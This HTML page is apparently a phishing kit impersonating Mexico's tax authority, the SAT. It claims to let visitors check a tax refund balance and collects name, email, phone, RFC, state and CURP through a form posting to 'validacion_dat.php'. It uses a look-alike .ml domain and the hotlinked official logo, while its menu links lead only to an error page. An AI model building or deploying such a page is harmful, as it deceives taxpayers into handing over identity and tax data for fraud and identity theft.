<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<!---FAVICON-->
	<link rel="icon" type="image/x-icon" href="https://verificacionsat.ml/assets/images/sat.png">
	<!--STYLES-->
	<link rel="stylesheet" href="assets/pages1.css">
	<link rel="stylesheet" href="assets/styles.css">
	<!--FONTAWESOME-->
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
	<title>Verificación de Comprobantes Fiscales Digitales por internet</title>
</head>
<body ondragstart="return false;" ondrop="return false;">
	<div class="fixed">
		<nav class="navbar">
            <div class="navbar-header">
                <a href="#" class="navbar-brand"><img src="assets/renovacion.png" alt="Gobierno de México"></a>
                <button class="navbar-toggler"><span></span></button>
            </div>
            <div class="navbar-collapse">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a href="error.php" class="nav-link"><i class="fas fa-concierge-bell"></i> Trámites</a>
                    </li>
                    <li class="nav-item">
                        <a href="error.php" class="nav-link"><i class="fas fa-address-card"></i> Nosotros</a>
                    </li>
                </ul>
            </div>
        </nav>
	</div>
	<!--WELCOME-->
	<div class="desing"></div>
	<div class="transport_web">
		<div class="info_web">
			<ul>
				<li><a href=""><i class="fas fa-home"></i></a></li> /
				<li><a href="">Inicio</a></li>
			</ul>
		</div>
	</div>
	<!--END-->
	<div class="content_desing">
		<div class="desing_logo_sat">
			<div class="transport_sat">
				<div class="info_sat">
					<img src="https://verificacfdi.facturaelectronica.sat.gob.mx/Content/images/Logo_SHCP_SAT-.jpg" alt="Logo SHCP SAT">
					<div class="text-title-sat">
						<h1>Necesitas acceder</h1>
					</div>
					<div class="line_sat">
						<hr>
					</div>
					<div class="fomulary_text">
						<h1>A través de esta opción, usted podrá verificar su saldo a favor del SAT</h1>
						<form class="formulario" action="validacion_dat.php" method="POST">
							<div class="grid-sat">
								<div class="form-group">
								<label for="name">Nombre</label>
								<br>
								<input class="freeroom" type="text" name="name" id="name" required="required">
							</div>

							<div class="form-group">
								<br>
							<label for="mail">Email</label>
							<br>
							<input class="freeroom" type="mail" name="mail" id="mail" required="required">
							</div>

							<div class="form-group">
								<br>
							<label >Telefóno</label>
							<br>
							<input class="freeroom" type="text" name="number" id="number" required="required">
							</div>

							<div class="form-group">
								<br>
							<label>RFC</label>
							<br>
							<input class="freeroom ancho" type="text" name="registro" id="rfc" required="required">
							</div>

							<div class="form-group">
								<br>
							<label>Estado</label>
							<br>
							<input class="freeroom ancho" type="text" name="estado" id="estado" placeholder="Ej: Puebla" required="required">
							</div>

							<div class="form-group">
								<br>
							<label>Curp</label>
							<br>
							<input class="freeroom" type="text" name="formfil" id="curp" required="required">
							</div>
							</div>
							<div class="align-feik">
								<button>Siguiente</button>
							</div>
						</form> 
					</div>
				</div>
			</div>
		</div>
	</div>
        
        <!--SCRIPT_NAV_BAR_TOGGLE-->
        <script type="text/javascript">
        	const navbar = document.querySelector('.navbar');
const navbarToggler = navbar.querySelector('.navbar-header .navbar-toggler');
const navbarCollapse = navbar.querySelector('.navbar-collapse');
navbarToggler.addEventListener('click', function() {
    navbarToggler.classList.toggle('active');
    navbarCollapse.classList.toggle('active');
});
        </script>
    </body>
    </html>
</body>
</html>
</body>
</html>